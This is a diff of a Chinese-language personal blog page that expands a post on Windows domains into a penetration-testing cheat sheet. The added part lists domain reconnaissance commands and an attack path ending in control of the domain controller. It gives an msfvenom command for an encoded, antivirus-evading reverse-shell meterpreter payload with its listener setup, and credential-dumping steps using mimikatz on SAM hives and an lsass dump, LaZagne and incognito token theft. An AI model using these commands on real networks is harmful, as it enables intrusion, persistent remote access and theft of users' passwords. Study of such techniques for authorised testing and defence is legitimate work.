@@ -94,8 +94,19 @@
 <meta property="og:site_name" content="君の银の庭">
 <meta property="og:description" content="Part 1 相关概念域域(domain)是Windows中独立运行的单位,将网络中多台计算机逻辑上组织到一起,进行集中管理,这种区别于工作组的逻辑环境叫做域域已经成为绝大多数公司组织、连接电脑的一种方式。假设你是公司的系统管理员,你们公司有几千上万台电脑,如果你要为每台电脑设置登录帐户,设置权限(比如是否允许登录帐户安装软件),那你要分别坐在这一十台电脑前工作,如果你要做一些改变,你也要分别在这">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-03T06:01:17.728Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;LDAP.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;net1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;nbtscan1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;silu1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;issa1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;issa2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;lazagne.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;pzqq.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;incognito1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;incognito2.png">
+<meta property="og:updated_time" content="2019-12-03T10:22:17.214Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;domain&#x2F;LDAP.png">
 
 
 
@@ -347,7 +358,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  2k
                 </span>
               
 
@@ -363,7 +374,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3
+                  7
                 </span>
               
             </div>
@@ -392,16 +403,65 @@
 <p>登录到域控制器上,对一切权限进行控制,而不用跑到每台电脑前进行设置了。</p>
 <h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>公司很多员工的权限都是相同的,那我们可不可以对这些相同的权限只设置一次,然后将该权限分配给相关的员工呢?答案就是使用分组(Group)。将不同的用户放入不同的分组里,然后对组进行权限设置,这样就免去了我们要对每个用户进行设置的麻烦。</p>
 <h2 id="信任域"><a href="#信任域" class="headerlink" title="信任域"></a>信任域</h2><p>在很多的实际情况中,一个公司又有下面的子公司,所以就造成母公司有一个域,而子公司也有一个单独的域。母公司的域与子公司的域如何联系起来呢?我们可以在它们之间建立一种咤信任(Trust)的关系。如果母公司的帐户意要能够登录到子公司的域中,子公司的域就要对母公司的域建立信任关系。当母公司域的帐户想要登录到子公司域中时,子公司域由于信任母公司的域,所以它会听从从母公司域的域控制器返回的<code>accesskey</code>。反过来,由于母公司的域没有建立对子公司的信任,所以如果子公司的帐户想要登录到母公司的域中是不可能的。<br><code>/domain_trusts</code>返回受信任域的列表</p>
-<h1 id="Part-2-域信息收集"><a href="#Part-2-域信息收集" class="headerlink" title="Part 2 域信息收集"></a>Part 2 域信息收集</h1><h2 id="2-1-nltest"><a href="#2-1-nltest" class="headerlink" title="2.1 nltest"></a>2.1 nltest</h2><p>信任域:可以在工作组里查询,查询内网里是否有域环境</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest/domain_trusts/all_trusts/v/server:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<h1 id="Part-2-域信息收集"><a href="#Part-2-域信息收集" class="headerlink" title="Part 2 域信息收集"></a>Part 2 域信息收集</h1><h2 id="nltest"><a href="#nltest" class="headerlink" title="nltest"></a>nltest</h2><p>信任域:可以在工作组里查询,查询内网里是否有域环境</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts/v/server:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
 <p><code>192.168.52.2</code>是域控<code>IP</code>,一般是<code>DNS</code>服务器<code>IP</code><br>返回所有信任<code>192.168.2.252</code>的域,<code>nltest</code>的命令:</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest/dsgetdc:XXXXXX/server:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-<p>返回域控和其相应的IP地址,XXXXXX是上步骤结果中的一个域</p>
+<p>返回域控和其相应的 IP 地址,XXXXXX 是上步骤结果中的一个域</p>
 <p>nltest 其他参数看这里=》 <a href="https://www.cnblogs.comy/dreamer-fish/p/3473895.html" target="_blank" rel="noopener">https://www.cnblogs.comy/dreamer-fish/p/3473895.html</a></p>
-<h2 id="2-2-csvde"><a href="#2-2-csvde" class="headerlink" title="2.2  csvde"></a>2.2  csvde</h2><p>Csvde是WindowsServer2008的内置命令行工具,位于%windir9%/system32文件夹中。如果您安装了ADDS或ActiveDirectory轻型目录服<br>务(ADLDS)服务器角色,则此功能可用。</p>
-<p>适用于:WindowsServer2003,WindowsServer2008,WindowsServer2003R2,WindowsServer2008R2,WindowsServer2012,<br>带有;P1,Windows8的WindowsServer2003</p>
-<p>csvde-setspnhack-fc:xwindowsxtemp\Mhack.csv</p>
+<h2 id="csvde"><a href="#csvde" class="headerlink" title="csvde"></a>csvde</h2><p><code>Csvde</code>是<code>Windows Server2008</code>的内置命令行工具,位于<code>%windir%/system32</code>文件夹中。如果您安装了<code>AD DS</code>或<code>ActiveDirectory轻型目录服务(AD LDS)服务器角色</code>,则此功能可用。</p>
+<p>适用于:<br><code>Windows Server2003</code>,<code>WindowsServer2008</code>,<code>WindowsServer2003R2</code>,<code>WindowsServer2008R2</code>,<code>WindowsServer2012,</code>带有<code>SP1</code>,<code>Windows8的WindowsServer2003</code></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csvde -setspn domainname -f c:\windows\temp\hack.csv</span><br></pre></td></tr></table></figure>
+
+<p>LDAP 的存储规则</p>
+<p>区分名(DN,Distinguished Name)一个条目的区分名称叫做“dn“或者叫做区分名。在一个目录中这个名称总是唯一的。<br>CN=CommonName 为用户名或服务器名,最长可以到 80 个字符,可以为中文;</p>
+<p>OU=OrganizationUnit 为组织单元,最多可以有四级,每级最长 32 个字符,可以为中文;</p>
+<p>O=Organization 为组织名,可以 3 一 64 个字符长</p>
+<p>C=Country 为国家名,可选,为 2 个字符长<br><img src="/2019/12/03/domain/LDAP.png" alt="LDAP"></p>
+<h2 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h2><p>命令</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domamin- Q */*</span><br></pre></td></tr></table></figure>
+
+<p>SPN 官方名称即“服务主体名称“,本质上存的就是域内各种服务资源<br>的对应关系</p>
+<p>如,对应的服务类型是什么,机器名是多少,服务端口是多少</p>
+<p>借助 SPN 快速定位当前目标域中所有存活的各类服务器</p>
+<h2 id="DNSDump"><a href="#DNSDump" class="headerlink" title="DNSDump"></a>DNSDump</h2><p>命令</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码 域控机器名</span><br><span class="line">![dnsbump](domain/dnsdump1.png)</span><br></pre></td></tr></table></figure>
+
+<h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain                       获取域用户列表</span><br><span class="line"><span class="built_in">net</span> group "domain admins" /domain      获取域管理员列表</span><br><span class="line"><span class="built_in">net</span> group "domain controllers" /domain 查看域控制器</span><br><span class="line"><span class="built_in">net</span> group "domain computers" /domain   查看与机器</span><br><span class="line"><span class="built_in">net</span> group /domain                      查询域里面的组</span><br><span class="line"><span class="built_in">net</span> view                               查看同一域内机器列表</span><br><span class="line"><span class="built_in">net</span> view \\ip                          查看某IP共享</span><br><span class="line"><span class="built_in">net</span> view \\GHQ                         查看GHQ计算机的共享资源列表</span><br><span class="line"><span class="built_in">net</span> view /domain                       查看内网存在多少个域</span><br><span class="line"><span class="built_in">net</span> view /domain:XYZ                   查看XYZ域中的机器列表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/03/domain/net1.png" alt="net"></p>
+<h2 id="2-6-nbtscan"><a href="#2-6-nbtscan" class="headerlink" title="2.6 nbtscan"></a>2.6 nbtscan</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe ip段</span><br></pre></td></tr></table></figure>
+
+<p>有<code>DC</code>标识的主机即为<code>域控</code><br><img src="/2019/12/03/domain/nbtscan1.png" alt="nbtscan"></p>
+<h1 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>横向渗透-&gt;权限维持-&gt;获取一个域用户的账号密码-&gt;域信息收集-&gt;横向渗透-&gt;获取密码-&gt;获取域管权限-&gt;拿下域控服务器</p>
+<h2 id="横向渗透思路"><a href="#横向渗透思路" class="headerlink" title="横向渗透思路"></a>横向渗透思路</h2><p>使用于工作组和域渗透<br><img src="/2019/12/03/domain/silu1.png" alt="silu"></p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><code>dll</code>加载<code>shellcode</code>免杀上线</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msfvenom -a x86--platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=9999 LHOST=192.168.1.1 -e</span><br><span class="line">x86/shikata_ga_nai -i 11 -f c -o shellcode.c</span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash">use exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp_uuid</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> lhost 192.168.1.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> lport 9999</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> StageEncoder x86/fnsteny_mov</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash">exploit</span></span><br></pre></td></tr></table></figure>
+
+<p>待续</p>
+<h2 id="注册表读取密码"><a href="#注册表读取密码" class="headerlink" title="注册表读取密码"></a>注册表读取密码</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>导出 <code>HKLM\SYSTEM</code>和<code>\HKLM\SAM</code>后用<code>mimakatz</code>解密</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM</span><br><span class="line">c:\windows\temp\Sys.hiv</span><br><span class="line">reg save HKLM\SAM</span><br><span class="line">c:\windows\temp\Sam.hiv</span><br><span class="line"></span><br><span class="line"><span class="comment">//mimakatz 解密</span></span><br><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv</span><br></pre></td></tr></table></figure>
+
+<h3 id="Isass-读取密码"><a href="#Isass-读取密码" class="headerlink" title="Isass 读取密码"></a>Isass 读取密码</h3><p>// 在目标主机执行<code>procdump.exe</code></p>
+<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>//在<code>mimikatz</code>中运行,结果保存在日志里</p>
+<pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></pre><p><code>windows server 2008</code>及以前的版本,密码是明文存储</p>
+<p><img src="/2019/12/03/domain/issa1.png" alt="Ilsass1"><br><code>windows server 12</code>及之后的版本,密码是<code>hash</code>密文</p>
+<p><img src="/2019/12/03/domain/issa2.png" alt="lsassa2"></p>
+<h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><code>LaZagne</code>可以取各种连接工具密码,浏览器保存的密码等<br><img src="/2019/12/03/domain/lazagne.png" alt="lazagne"></p>
+<h3 id="incognito-凭证窃取"><a href="#incognito-凭证窃取" class="headerlink" title="incognito 凭证窃取"></a>incognito 凭证窃取</h3><p>通过<code>tasklist /v</code>查看进程用户,如果有域用户启动的进程,则可以使用<code>incognito</code>进行凭证窃取<br><img src="/2019/12/03/domain/pzqq.png" alt="tasklist"></p>
+<p><code>incognito.exe list_tokens -u //查看本机保存的凭证</code><br><img src="/2019/12/03/domain/incognito1.png" alt="incognito1"><br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code><br><img src="/2019/12/03/domain/incognito2.png" alt="incognito2"></p>
+<h2 id="命令行渗透"><a href="#命令行渗透" class="headerlink" title="命令行渗透"></a>命令行渗透</h2><p>为什么命令行渗透?</p>
+<p>1，远程登录桌面增加暴露风睑</p>
+<ol>
+<li>目标管理员可能对服务器禁用远程登陆。</li>
+</ol>
+<p>前提是建立 IPC 连接</p>
+<p>可以访问目标机器的文件(上传、下载),也可以在目标机器上运行命令,</p>
+<p>上传和下载文件直接通过 copy 命令就可以,不过路径换成 UNC 路径,</p>
+<p>何为 UNC 路径?简单来讲以\开头的路径就是 UNC 路径,比如\192.168.1.2\cSAusers<br>如果要从本地当前目录上传 1.bat 到 192.168.1.2 机器 C 盘根目录下,</p>
+<p>那么命令就是 copy1.bat\192.168.1.2\C$\ 反之就是下载.<br>dir、copy、xcopy、move、type 的参数都可以使用 UNC 路径。</p>
 
       
     </div>
@@ -445,10 +505,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/12/03/test/" rel="prev" title="test">
-                test <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -529,7 +585,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -600,7 +656,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-1-相关概念"><span class="nav-number">1.</span> <span class="nav-text">Part 1 相关概念</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#域"><span class="nav-number">1.1.</span> <span class="nav-text">域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#活动目录-ActiveDirectory"><span class="nav-number">1.2.</span> <span class="nav-text">活动目录(ActiveDirectory)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域控-域控制器"><span class="nav-number">1.3.</span> <span class="nav-text">域控(域控制器)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域用户"><span class="nav-number">1.4.</span> <span class="nav-text">域用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域管-域管理员"><span class="nav-number">1.5.</span> <span class="nav-text">域管(域管理员)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#组"><span class="nav-number">1.6.</span> <span class="nav-text">组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信任域"><span class="nav-number">1.7.</span> <span class="nav-text">信任域</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-2-域信息收集"><span class="nav-number">2.</span> <span class="nav-text">Part 2 域信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-nltest"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 nltest</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-csvde"><span class="nav-number">2.2.</span> <span class="nav-text">2.2  csvde</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-1-相关概念"><span class="nav-number">1.</span> <span class="nav-text">Part 1 相关概念</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#域"><span class="nav-number">1.1.</span> <span class="nav-text">域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#活动目录-ActiveDirectory"><span class="nav-number">1.2.</span> <span class="nav-text">活动目录(ActiveDirectory)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域控-域控制器"><span class="nav-number">1.3.</span> <span class="nav-text">域控(域控制器)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域用户"><span class="nav-number">1.4.</span> <span class="nav-text">域用户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域管-域管理员"><span class="nav-number">1.5.</span> <span class="nav-text">域管(域管理员)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#组"><span class="nav-number">1.6.</span> <span class="nav-text">组</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信任域"><span class="nav-number">1.7.</span> <span class="nav-text">信任域</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-2-域信息收集"><span class="nav-number">2.</span> <span class="nav-text">Part 2 域信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nltest"><span class="nav-number">2.1.</span> <span class="nav-text">nltest</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#csvde"><span class="nav-number">2.2.</span> <span class="nav-text">csvde</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setspn"><span class="nav-number">2.3.</span> <span class="nav-text">setspn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNSDump"><span class="nav-number">2.4.</span> <span class="nav-text">DNSDump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#net"><span class="nav-number">2.5.</span> <span class="nav-text">net</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-6-nbtscan"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 nbtscan</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域渗透思路"><span class="nav-number">3.</span> <span class="nav-text">域渗透思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#整体思路"><span class="nav-number">3.1.</span> <span class="nav-text">整体思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向渗透思路"><span class="nav-number">3.2.</span> <span class="nav-text">横向渗透思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限维持"><span class="nav-number">3.3.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注册表读取密码"><span class="nav-number">3.4.</span> <span class="nav-text">注册表读取密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-number">3.4.1.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Isass-读取密码"><span class="nav-number">3.4.2.</span> <span class="nav-text">Isass 读取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LaZagne"><span class="nav-number">3.4.3.</span> <span class="nav-text">LaZagne</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#incognito-凭证窃取"><span class="nav-number">3.4.4.</span> <span class="nav-text">incognito 凭证窃取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令行渗透"><span class="nav-number">3.5.</span> <span class="nav-text">命令行渗透</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -643,7 +699,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">3.5k</span>
+    <span title="Site words total count">4.3k</span>
   
 </div>
 
